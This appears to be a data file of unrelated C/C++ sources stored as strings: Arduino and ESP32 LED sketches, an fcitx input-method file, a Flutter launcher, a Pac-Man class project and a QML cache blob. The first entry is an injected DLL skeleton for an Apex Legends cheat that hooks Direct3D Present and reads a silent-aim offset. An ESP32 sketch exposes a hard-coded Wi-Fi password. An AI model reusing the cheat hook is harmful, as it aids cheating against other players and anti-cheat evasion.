    "#include <Windows.h>\r\n#include <iostream>\r\n#include \"Menu.hpp\"\r\n\r\n\r\nvoid CreateConsole()\r\n{\r\n\r\n\tif (!AllocConsole()) {\r\n\t\treturn;\r\n\t}\r\n\r\n\tFILE* fDummy;\r\n\tfreopen_s(&fDummy, \"CONOUT$\", \"w\", stdout);\r\n\tfreopen_s(&fDummy, \"CONOUT$\", \"w\", stderr);\r\n\tfreopen_s(&fDummy, \"CONIN$\", \"r\", stdin);\r\n\tstd::cout.clear();\r\n\tstd::clog.clear();\r\n\tstd::cerr.clear();\r\n\tstd::cin.clear();\r\n\r\n\tHANDLE hConOut = CreateFile((\"CONOUT$\"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\r\n\tHANDLE hConIn = CreateFile((\"CONIN$\"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\r\n\tSetStdHandle(STD_OUTPUT_HANDLE, hConOut);\r\n\tSetStdHandle(STD_ERROR_HANDLE, hConOut);\r\n\tSetStdHandle(STD_INPUT_HANDLE, hConIn);\r\n\tstd::wcout.clear();\r\n\tstd::wclog.clear();\r\n\tstd::wcerr.clear();\r\n\tstd::wcin.clear();\r\n}\r\n\r\nDWORD WINAPI MainThread(LPVOID lpReserved)\r\n{\r\n\tCreateConsole();\r\n\tstd::cout << R\"(\r\n                                    /@\r\n                     __        __   /\\/\r\n                    /==\\      /  \\_/\\/   \r\n                  /======\\    \\/\\__ \\__\r\n                /==/\\  /\\==\\    /\\_|__ \\\r\n             /==/    ||    \\=\\ / / / /_/\r\n           /=/    /\\ || /\\   \\=\\/ /     \r\n        /===/   /   \\||/   \\   \\===\\\r\n      /===/   /_________________ \\===\\\r\n   /====/   / |                /  \\====\\\r\n /====/   /   |  _________    /  \\   \\===\\    THE LEGEND OF \r\n /==/   /     | /   /  \\ / / /  __________\\_____      ______       ___\r\n|===| /       |/   /____/ / /   \\   _____ |\\   /      \\   _ \\      \\  \\\r\n \\==\\             /\\   / / /     | |  /= \\| | |        | | \\ \\     / _ \\\r\n \\===\\__    \\    /  \\ / / /   /  | | /===/  | |        | |  \\ \\   / / \\ \\\r\n   \\==\\ \\    \\\\ /____/   /_\\ //  | |_____/| | |        | |   | | / /___\\ \\\r\n   \\===\\ \\   \\\\\\\\\\\\\\/   /////// /|  _____ | | |        | |   | | |  ___  |\r\n     \\==\\/     \\\\\\\\/ / //////   \\| |/==/ \\| | |        | |   | | | /   \\ |\r\n     \\==\\     _ \\\\/ / /////    _ | |==/     | |        | |  / /  | |   | |\r\n       \\==\\  / \\ / / ///      /|\\| |_____/| | |_____/| | |_/ /   | |   | |\r\n       \\==\\ /   / / /________/ |/_________|/_________|/_____/   /___\\ /___\\\r\n         \\==\\  /               | /==/\r\n         \\=\\  /________________|/=/    APEX PRIVATE CHEATS\r\n           \\==\\     _____     /==/ \r\n          / \\===\\   \\   /   /===/\r\n         / / /\\===\\  \\_/  /===/\r\n        / / /   \\====\\ /====/\r\n       / / /      \\===|===/\r\n       |/_/         \\===/\r\n                      =\r\n)\";\r\n\tprintf(\"\\n[+] Ctr.priv Hook Init\\n\");\r\n\tbool init_hook = false;\r\n\tdo\r\n\t{\r\n\t\tif (kiero::init(kiero::RenderType::D3D11) == kiero::Status::Success)\r\n\t\t{\r\n\t\t\tkiero::bind(8, (void**)&oPresent, hkPresent);\r\n\t\t\tinit_hook = true;\r\n\t\t}\r\n\t} while (!init_hook);\r\n\treturn TRUE;\r\n}\r\n//void functionref(entity projectile, vector3 pos, entity hitEnt, int hitbox, bool passthrough)\r\nvoid DoHooks()\r\n{\r\n\tauto PSilent_Function = *reinterpret_cast<std::uintptr_t*>((uintptr_t)GetModuleHandleA(NULL) + 0x74A3708);\r\n}\r\nbool InitCheat = false;\r\n\r\nBOOL WINAPI DllMain(HMODULE hMod, DWORD dwReason, LPVOID lpReserved)\r\n{\r\n\tswitch (dwReason)\r\n\t{\r\n\tcase DLL_PROCESS_ATTACH:\r\n\t\tCreateThread(nullptr, 0, MainThread, lpReserved, 0, nullptr);\r\n\t\tbreak;\r\n\tcase DLL_PROCESS_DETACH:\r\n\t\tkiero::shutdown();\r\n\t\tbreak;\r\n\t}\r\n\treturn TRUE;\r\n}\r\n\r\n",
    "#include <FastLED.h>\n#include <WiFi.h>\n#include <HTTPClient.h>\n#include <ESPAsyncWebServer.h>\n#include <ArduinoOTA.h>\n\n\n#define NUM_LEDS 20 // number of leds of each strip \n#define DATA_PINA 17 // Connect to the data wires on the pixel strips\n#define DATA_PINB 19\n#define DATA_PINC 16\n// pins for the buttons se sugiere 5,25,26\n#define BUTTON_PINA 5\n#define BUTTON_PINB 5\n#define BUTTON_PINC 5\n\n// Supported colors for the strips\nstd::map<String, CRGB> colorMap = {\n    {\"Red\", CRGB::Red},\n    {\"Green\", CRGB::Green},\n    {\"Blue\", CRGB::Blue},\n    {\"Orange\", CRGB::Orange},\n    {\"Yellow\", CRGB::Yellow},\n    {\"Purple\", CRGB::Purple},\n    {\"Cyan\", CRGB::Cyan},\n    {\"White\", CRGB::White}};\n\nbool gameStarted = false;\n\nCRGB ledsA[NUM_LEDS]; // sets number of pixels that will light on each strip.\nCRGB ledsB[NUM_LEDS];\nCRGB ledsC[NUM_LEDS];\n\n// URL to send the result when the puzle is ready (all the strips selected)\nconst char *url2SendResult = \"https://eovunmo8a5u8h34.m.pipedream.net\";\n\n// #define WOWKI_EMULATION\n#ifdef WOWKI_EMULATION\n\nconst char *ssid = \"Wokwi-GUEST\";\nconst char *password = \"\";\n#else\nconst char *ssid = \"blackcrow_01\";\nconst char *password = \"8001017170\";\n#endif\n\n// LED control variables\nint ledIndexes[3]; // number of leds ON for each strip (it moves until player selects)\nCRGB ledColors[3]; // Colors of the strips\nbool alreadySelected[3]; // To know if the player has selected a number of leds for this strip\nint buttonPins[3]; // to hold the button pins\nbool buttonPressed[3]; // To know if the button for a strip was pressed\n\nbool increasing[3]; // indicates if the light in the strip is moving forward or backward\nunsigned long lastUpdate = 0; // to handle update\nunsigned long updateInterval = 50; // how frequent to update the moving strip\nAsyncWebServer server(80); // to handle the published API\n\n/// @brief Allows to show a hint, when invoked, stops the game makes an animation and shows the LED quantity received as parameters\n/// @param countA How many LEDs to set to ON on Strip 0\n/// @param countB How many LEDs to set to ON on Strip 1\n/// @param countC How many LEDs to set to ON on Strip 2\nvoid hintLeds(int countA, int countB, int countC)\n{\n  gameStarted = false;\n  // Move forward and backward for each strip\n  for (int i = 0; i < NUM_LEDS; i++)\n  {\n    for (int j = 0; j < NUM_LEDS; j++)\n    {\n      ledsA[j] = (j <= i) ? ledColors[0] : CRGB::Black;\n      ledsB[j] = (j <= i) ? ledColors[1] : CRGB::Black;\n      ledsC[j] = (j <= i) ? ledColors[2] : CRGB::Black;\n    }\n    FastLED.show();\n    delay(updateInterval);\n  }\n\n  for (int i = NUM_LEDS - 1; i >= 0; i--)\n  {\n    for (int j = 0; j < NUM_LEDS; j++)\n    {\n      ledsA[j] = (j <= i) ? ledColors[0] : CRGB::Black;\n      ledsB[j] = (j <= i) ? ledColors[1] : CRGB::Black;\n      ledsC[j] = (j <= i) ? ledColors[2] : CRGB::Black;\n    }\n    FastLED.show();\n    delay(updateInterval);\n  }\n\n  // Blink five times at the speed of updateInterval\n  for (int k = 0; k < 5; k++)\n  {\n    for (int i = 0; i < NUM_LEDS; i++)\n    {\n      ledsA[i] = CRGB::Black;\n      ledsB[i] = CRGB::Black;\n      ledsC[i] = CRGB::Black;\n    }\n    FastLED.show();\n    delay(updateInterval);\n\n    for (int i = 0; i < NUM_LEDS; i++)\n    {\n      ledsA[i] = ledColors[0];\n      ledsB[i] = ledColors[1];\n      ledsC[i] = ledColors[2];\n    }\n    FastLED.show();\n    delay(updateInterval);\n  }\n\n  // Turn on the specific number of LEDs for each strip\n  for (int i = 0; i < NUM_LEDS; i++)\n  {\n    ledsA[i] = (i < countA) ? ledColors[0] : CRGB::Black;\n    ledsB[i] = (i < countB) ? ledColors[1] : CRGB::Black;\n    ledsC[i] = (i < countC) ? ledColors[2] : CRGB::Black;\n  }\n  FastLED.show();\n}\n\n/// @brief Used to indicate win or lose blinks and shutdown\n/// @param color \nvoid blinkAllLeds(int color)\n{\n  const int blinkDuration = 3000; // Total duration to blink in milliseconds\n  const int blinkInterval = 100;  // Blink interval in milliseconds\n  unsigned long startMillis = millis();\n  bool ledState = false;\n\n  CRGB colorToShow;\n  if (color == 1)\n    colorToShow = CRGB::Red;\n  else\n    colorToShow = CRGB::Green;\n\n  while (millis() - startMillis < blinkDuration)\n  {\n    ledState = !ledState;\n    for (int i = 0; i < NUM_LEDS; i++)\n    {\n      ledsA[i] = ledState ? colorToShow : CRGB::Black;\n      ledsB[i] = ledState ? colorToShow : CRGB::Black;\n      ledsC[i] = ledState ? colorToShow : CRGB::Black;\n    }\n    FastLED.show();\n    delay(blinkInterval);\n  }\n\n  // Turn off all LEDs after blinking\n  for (int i = 0; i < NUM_LEDS; i++)\n  {\n    ledsA[i] = CRGB::Black;\n    ledsB[i] = CRGB::Black;\n    ledsC[i] = CRGB::Black;\n  }\n  FastLED.show();\n}\n\n/// @brief Handle the API call\n/// @param request full request\n/// @param data JSON data\nvoid postRule(AsyncWebServerRequest *request, uint8_t *data)\n{\n  size_t len = request->contentLength();\n  Serial.println(\"Data: \");\n  Serial.write(data, len); // Correctly print the received data\n  Serial.println(\"\\nLength: \");\n  Serial.println(len);\n\n  // Construct the received data string with the ",
    "#include \"hazkey_candidate.h\"\n\nnamespace fcitx {\n\nstd::vector<std::string> HazkeyCandidateWord::getPreedit() const {\n    if (hiragana_.empty()) return {candidate_};\n    return {candidate_, hiragana_};\n}\n\nvoid HazkeyCandidateWord::select(InputContext* ic) const {\n    // \u82e6\u8089\u306e\u7b56:\n    // states\u306e\u30ea\u30b9\u30c8\u306e\u95a2\u6570\u3092\u547c\u3073\u51fa\u305b\u306a\u3044\u306e\u3067\u6570\u5b57\u30ad\u30fc\u30a4\u30d9\u30f3\u30c8\u3092\u9001\u3063\u3066\u9078\u629e\u3055\u305b\u308b\n    // createCandidateList\u7cfb\u3053\u3063\u3061\u306b\u6301\u3063\u3066\u304d\u305f\u65b9\u304c\u3044\u3044\n    // preeditCandidateList\u306f\u52b9\u304b\u306a\u3044\n    KeyEvent keyEvent(ic, Key(FcitxKey_Return));\n    switch (index_ % 9) {\n        case 0:\n            keyEvent = KeyEvent(ic, Key(FcitxKey_1));\n            break;\n        case 1:\n            keyEvent = KeyEvent(ic, Key(FcitxKey_2));\n            break;\n        case 2:\n            keyEvent = KeyEvent(ic, Key(FcitxKey_3));\n            break;\n        case 3:\n            keyEvent = KeyEvent(ic, Key(FcitxKey_4));\n            break;\n        case 4:\n            keyEvent = KeyEvent(ic, Key(FcitxKey_5));\n            break;\n        case 5:\n            keyEvent = KeyEvent(ic, Key(FcitxKey_6));\n            break;\n        case 6:\n            keyEvent = KeyEvent(ic, Key(FcitxKey_7));\n            break;\n        case 7:\n            keyEvent = KeyEvent(ic, Key(FcitxKey_8));\n            break;\n        case 8:\n            keyEvent = KeyEvent(ic, Key(FcitxKey_9));\n            break;\n    }\n    ic->keyEvent(keyEvent);\n}\n\nCandidateLayoutHint HazkeyCandidateList::layoutHint() const {\n    return CandidateLayoutHint::Vertical;\n}\n\nvoid HazkeyCandidateList::focus() {\n    setPageSize(9);\n    setGlobalCursorIndex(0);\n    focused_ = true;\n}\n\nconst HazkeyCandidateWord& HazkeyCandidateList::getCandidate(\n    int localIndex) const {\n    return static_cast<const HazkeyCandidateWord&>(candidate(localIndex));\n}\n\n}  // namespace fcitx",
    "/////////////////////////////////////////////////////////////////\n/*\n    CAR_LED.cpp - Arduino Library to manage LED output.\n    Created by Tommy Carlsson.\n*/\n/////////////////////////////////////////////////////////////////\n\n#include <CAR_LED.h>\n\n/////////////////////////////////////////////////////////////////\n\nCAR_LED::CAR_LED(byte p_outputPin) {\n    _outputPin = p_outputPin;\n    _outputState = LOW;\n    _blinkState = DISABLE;\n    _highTime = 0;\n    _lowTime  = 0;\n    _blinkTimes  = -1;\n    _timeSinceLastOutputChange = 0;\n    pinMode(_outputPin, OUTPUT);\n}\n\nvoid CAR_LED::high(void){\n    _blinkState = DISABLE;\n    _outputState = HIGH;\n    digitalWrite(_outputPin, _outputState);\n}\n\nvoid CAR_LED::low(void){\n    _blinkState = DISABLE;\n    _outputState = LOW;\n    digitalWrite(_outputPin, _outputState);\n}\n\nvoid CAR_LED::toggle(void) {\n    _blinkState = DISABLE;\n    _outputState = (_outputState == LOW) ? HIGH : LOW;\n    digitalWrite(_outputPin, _outputState);\n}\n\nvoid CAR_LED::blink(unsigned int p_lowTime, unsigned int p_highTime, unsigned int p_delayTime, int p_blinkTimes) {\n    _blinkStartState = _outputState;\n\t_highTime = p_highTime;\n    _lowTime = p_lowTime;\n    _delayTime = p_delayTime;\n    _blinkTimes = p_blinkTimes;\n\n\tif (_blinkState != BLINK) {\n\t\t_timeSinceLastOutputChange = 0;\n\t}\n\n\t// No need to check what delay time is requested, as it is checked in the loop().\n    if (_blinkState == DISABLE) {\n        _blinkState = DELAY;\n    }\n}\n\nvoid CAR_LED::blink(unsigned int p_lowTime, unsigned int p_highTime, unsigned int p_delayTime) {\n    blink(p_lowTime, p_highTime, p_delayTime, -1);\n}\n\nvoid CAR_LED::blink(unsigned int p_lowTime, unsigned int p_highTime) {\n    blink(p_lowTime, p_highTime, 0, -1);\n}\n\nbyte CAR_LED::getState(void) {\n    return _outputState;\n}\n\nvoid CAR_LED::loop(void) {\n    bool blinkIsDue = false;\n    if (_blinkTimes == 0) {\n        _blinkState = DISABLE;\n    }\n\n    switch (_blinkState) {\n        case DISABLE:\n            return;\n        case DELAY:\n            if (_timeSinceLastOutputChange >= _delayTime) {\n                blinkIsDue = true;\n                _blinkState = BLINK;\n            }\n            break;\n        case BLINK:\n            if (_outputState == LOW && _timeSinceLastOutputChange >= _lowTime) {\n                blinkIsDue = true;\n            } else if (_outputState == HIGH && _timeSinceLastOutputChange >= _highTime) {\n                blinkIsDue = true;\n            }\n            break;\n        default:\n            return;\n    }\n\n    if (blinkIsDue) {\n        _outputState = (_outputState == LOW) ? HIGH : LOW;\n        digitalWrite(_outputPin, _outputState);\n        _timeSinceLastOutputChange = 0;\n\t\t// Only reduce the remaining blinktimes if the changed output is now back to the startstate.\n\t\t// This means you can start from LED HIGH or LOW, and it will blink it back to the state it was when started.\n        if (_outputState == _blinkStartState && _blinkTimes > 0) {\n            _blinkTimes--;\n        }\n    }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_particle_attraction_simulation\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Defini\u00e7\u00e3o dos pinos dos LEDs\nconst int ledVerde1 = 5;\nconst int ledVerde2 = 25;\nconst int ledAmarelo1 = 4;\nconst int ledAmarelo2 = 22;\nconst int ledVermelho1 = 2;\nconst int ledVermelho2 = 33;\nint tempoA = 2000;\nint tempoV = 5000;\n\nvoid luzVe() {\ndigitalWrite(ledVerde1, HIGH);\n  digitalWrite(ledVerde2, LOW);\n  digitalWrite(ledAmarelo1, LOW);\n  digitalWrite(ledAmarelo2, LOW);\n  digitalWrite(ledVermelho1, LOW);\n  digitalWrite(ledVermelho2, HIGH);\n  delay(tempoV);\n}\n\nvoid luzA() {\n  digitalWrite(ledVerde1, LOW);\n  digitalWrite(ledVerde2, LOW);\n  digitalWrite(ledAmarelo1, HIGH);\n  digitalWrite(ledAmarelo2, LOW);\n  digitalWrite(ledVermelho1, LOW);\n  digitalWrite(ledVermelho2, HIGH);\n  delay(tempoA);\n}\n\nvoid luzVr() {\n  digitalWrite(ledVerde1, LOW);\n  digitalWrite(ledVerde2, HIGH);\n  digitalWrite(ledAmarelo1, LOW);\n  digitalWrite(ledAmarelo2, LOW);\n  digitalWrite(ledVermelho1, HIGH);\n  digitalWrite(ledVermelho2, LOW);\n  delay(tempoV);\n}\n\nvoid luzAm(){\n  digitalWrite(ledVerde1, LOW);\n  digitalWrite(ledVerde2, LOW);\n  digitalWrite(ledAmarelo1, LOW);\n  digitalWrite(ledAmarelo2, HIGH);\n  digitalWrite(ledVermelho1, HIGH);\n  digitalWrite(ledVermelho2, LOW);\n  delay(tempoA);\n}\n\nvoid setup() {\n  // Configura\u00e7\u00e3o dos pinos como sa\u00edda\n  pinMode(ledVerde1, OUTPUT);\n  pinMode(ledVerde2, OUTPUT);\n  pinMode(ledAmarelo1, OUTPUT);\n  pinMode(ledAmarelo2, OUTPUT);\n  pinMode(ledVermelho1, OUTPUT);\n  pinMode(ledVermelho2, OUTPUT);\n}\n\nvoid loop() {\n  luzVe();\n  luzA();\n  luzVr();\n  luzAm();\n}",
    "#include <iostream>\n#include <fstream>\n#include <cctype>\n#include <string>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <pthread.h>\n#include <semaphore.h>\n#include <SFML/Audio.hpp>\n#include <SFML/Graphics.hpp>\n#include <vector>\n#include <unistd.h>\n#include <cstdlib>\n#include <ctime>\n#include <iostream>\n\nusing namespace std;\nusing namespace sf;\n\npthread_mutex_t gameMutex = PTHREAD_MUTEX_INITIALIZER;\nbool gameStarted = false;\n\nint lives = 3;\nsem_t palletSemaphore;\nbool powerPalletEaten = false;\n\nvoid *powerPalletTimer(void *arg)\n{\n    sleep(15); // Sleep for 15 seconds\n    powerPalletEaten = false;\n    sem_post(&palletSemaphore); // Release the semaphore after 15 seconds\n    pthread_exit(NULL);\n}\n\nint matrix[21][28] =\n    {\n        {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},\n        {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},\n        {1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1},\n        {1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1},\n        {1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1},\n        {1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1}, // 5,12\n        {1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1},\n        {1, 0, 1, 1, 0, 1, 1, 0, 1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 1, 0, 1, 1, 0, 1, 1, 0, 1},\n        {1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1},\n        {0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0},\n        {1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1},\n        {0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0},\n        {1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1},\n        {1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1},\n        {1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1},\n        {1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1},\n        {1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1},\n        {1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 2, 1, 1, 0, 1},\n        {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},\n        {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}};\n\nclass Tile\n{\npublic:\n    int sizeX;\n    int sizeY;\n    int posX;\n    int posY;\n    sf::Sprite sprite;\n    char type;\n\n    Tile(sf::Texture &, sf::Sprite, int, int, int xOfRect = 264, int sX = 32, int sY = 32);\n\n    void draw(sf::RenderWindow &window);\n};\nclass Map\n{\npublic:\n    std::vector<Tile> tilemap;\n\n    void generate(sf::RenderWindow &window, sf::Texture &tileTexture, int xOfRect);\n};\nstruct Key_Permit\n{\n    bool has_key = false;\n    bool is_out = false;\n    bool has_permit = false;\n};\nstruct cord_grid\n{\n    int x = 0, y = 0;\n};\nClock Ghost_escape;\nint permit_count = 2;\nint key_count = 2;\nint ghost_count = 4;\nVector2f Ghost_screen_pos[4];\nKey_Permit Key_info[4];\ncord_grid ghost_grid_pos[4];\nstring ghost_char[4] = {\"simple\", \"fast\", \"fast\", \"ai\"};\nstring ghost_color[4] = {\"Red\", \"Blue\", \"Pink\", \"Inky\"};\ncord_grid Default_Ghost[4] = {{7, 10}, {7, 12}, {7, 14}, {7, 16}};\nSprite Ghosts[4];\nTexture G_texture[4];\n\npthread_mutex_t key_mutex = PTHREAD_MUTEX_INITIALIZER;\npthread_mutex_t key2_mutex = PTHREAD_MUTEX_INITIALIZER;\npthread_mutex_t permit_mutex = PTHREAD_MUTEX_INITIALIZER;\npthread_mutex_t permit2_mutex = PTHREAD_MUTEX_INITIALIZER;\npthread_mutex_t main_mutex[4]; //= PTHREAD_MUTEX_INITIALIZER;\n\npthread_mutex_t Ghost_mutex[4];\nchar moves[49] = {'L', 'U', 'L', 'U', 'L', 'D', 'L', 'D', 'R', 'D', 'L', 'U', 'R', 'D', 'L', 'U', 'R', 'U', 'L', 'U', 'L', 'D', 'L', 'D', 'R', 'D', 'R', 'D', 'R', 'D', 'L', 'U', 'R', 'U', 'L', 'U', 'L', 'D', 'L', 'U', 'R', 'D', 'L', 'D', 'R', 'D', 'R', 'U', 'R'};\nint walk[49] = {2, 2, 5, 2, 3, 2, 1, 3, 1, 3, 3, 8, 25, 8, 3, 3, 1, 3, 1, 2, 3, 2, 5, 2, 5, 5, 3, 1, 3, 7, 3, 2, 1, 3, 1, 3, 3, 8, 19, 7, 3, 2, 1, 3, 1, 2, 3, 13, 7};\nint moves_max = 49;\nconst char title[] = \"OS-Project-PAC_MAN-Spring-2024\";\n\nSprite gr[21][28];\nTexture Gr_tile;\nint var = 0;\n\nvoid func_draw();\nstring calc_move_AI()\n{\n    return \"right\";\n}\nvoid set_text_ghost_Red(char move, int index);\nvoid set_text_ghost_Blue(char move, int index);\nvoid set_text_ghost_Pink(char move, int index);\nvoid set_text_ghost_Inky(char move, int index);\n\nvoid Quarintine(int index)\n{\n    Clock stop;\n\n    while (!Key_info[index].is_out)\n    {\n\n        if (pthread_mutex_trylock(&key_mutex) != 0)\n        {\n            // cout << \"\\nwait:\" << index;\n            // continue;\n            // stop.restart();\n            // while (stop.getElapsedTime().a",
    "// /qt/qml/FluentUI/Controls/FluRouter.qml\n#include <QtQml/qqmlprivate.h>\n#include <QtCore/qdatetime.h>\n#include <QtCore/qobject.h>\n#include <QtCore/qstring.h>\n#include <QtCore/qstringlist.h>\n#include <QtCore/qtimezone.h>\n#include <QtCore/qurl.h>\n#include <QtCore/qvariant.h>\n#include <QtQml/qjsengine.h>\n#include <QtQml/qjsprimitivevalue.h>\n#include <QtQml/qjsvalue.h>\n#include <QtQml/qqmlcomponent.h>\n#include <QtQml/qqmlcontext.h>\n#include <QtQml/qqmlengine.h>\n#include <QtQml/qqmllist.h>\n#include <type_traits>\nnamespace QmlCacheGeneratedCode {\nnamespace _qt_qml_FluentUI_Controls_FluRouter_qml {\nextern const unsigned char qmlData alignas(16) [];\nextern const unsigned char qmlData alignas(16) [] = {\n\n0x71,0x76,0x34,0x63,0x64,0x61,0x74,0x61,\n0x3f,0x0,0x0,0x0,0x1,0x7,0x6,0x0,\n0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0xec,0xd,0x0,0x0,0x34,0x30,0x34,0x63,\n0x33,0x61,0x66,0x64,0x66,0x39,0x30,0x37,\n0x31,0x36,0x32,0x65,0x32,0x63,0x61,0x32,\n0x34,0x66,0x62,0x36,0x35,0x39,0x38,0x63,\n0x34,0x37,0x38,0x66,0x64,0x31,0x30,0x66,\n0x31,0x39,0x66,0x65,0x0,0x0,0x0,0x0,\n0x0,0x0,0x0,0x0,0x5a,0x8e,0x62,0x10,\n0xce,0xc,0x52,0x89,0xee,0x99,0xb8,0x7a,\n0xda,0xcf,0x9c,0x2c,0x0,0x0,0x0,0x0,\n0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0x0,0x0,0x0,0x0,0x27,0x0,0x0,0x0,\n0x2b,0x0,0x0,0x0,0xd8,0x7,0x0,0x0,\n0x6,0x0,0x0,0x0,0xf8,0x0,0x0,0x0,\n0x0,0x0,0x0,0x0,0x10,0x1,0x0,0x0,\n0x0,0x0,0x0,0x0,0x10,0x1,0x0,0x0,\n0x0,0x0,0x0,0x0,0x10,0x1,0x0,0x0,\n0x2d,0x0,0x0,0x0,0x10,0x1,0x0,0x0,\n0x0,0x0,0x0,0x0,0xc4,0x1,0x0,0x0,\n0x2,0x0,0x0,0x0,0xd0,0x1,0x0,0x0,\n0x3,0x0,0x0,0x0,0xe0,0x1,0x0,0x0,\n0x0,0x0,0x0,0x0,0x8,0x2,0x0,0x0,\n0x0,0x0,0x0,0x0,0x8,0x2,0x0,0x0,\n0x0,0x0,0x0,0x0,0x8,0x2,0x0,0x0,\n0x0,0x0,0x0,0x0,0x8,0x2,0x0,0x0,\n0x0,0x0,0x0,0x0,0x8,0x2,0x0,0x0,\n0x0,0x0,0x0,0x0,0x8,0x2,0x0,0x0,\n0xff,0xff,0xff,0xff,0x0,0x0,0x0,0x0,\n0x0,0x0,0x0,0x0,0x0,0xd,0x0,0x0,\n0x8,0x2,0x0,0x0,0x58,0x2,0x0,0x0,\n0xa8,0x2,0x0,0x0,0x28,0x3,0x0,0x0,\n0xf0,0x3,0x0,0x0,0xd0,0x4,0x0,0x0,\n0x10,0x1,0x0,0x0,0x63,0x0,0x0,0x0,\n0x24,0x1,0x0,0x0,0x10,0x1,0x0,0x0,\n0x63,0x0,0x0,0x0,0x34,0x1,0x0,0x0,\n0x63,0x0,0x0,0x0,0x44,0x1,0x0,0x0,\n0x53,0x1,0x0,0x0,0x64,0x1,0x0,0x0,\n0x63,0x0,0x0,0x0,0x70,0x1,0x0,0x0,\n0x63,0x0,0x0,0x0,0x53,0x1,0x0,0x0,\n0x64,0x1,0x0,0x0,0x83,0x1,0x0,0x0,\n0xb4,0x0,0x0,0x0,0x43,0x0,0x0,0x0,\n0x94,0x1,0x0,0x0,0xa3,0x1,0x0,0x0,\n0xb4,0x1,0x0,0x0,0x83,0x1,0x0,0x0,\n0x43,0x0,0x0,0x0,0xd4,0x1,0x0,0x0,\n0xe0,0x1,0x0,0x0,0xf3,0x1,0x0,0x0,\n0x0,0x2,0x0,0x0,0xa3,0x1,0x0,0x0,\n0x14,0x2,0x0,0x0,0xb4,0x1,0x0,0x0,\n0x21,0x2,0x0,0x0,0x31,0x2,0x0,0x0,\n0xf1,0x0,0x0,0x0,0x63,0x0,0x0,0x0,\n0x70,0x1,0x0,0x0,0x63,0x0,0x0,0x0,\n0x20,0x2,0x0,0x0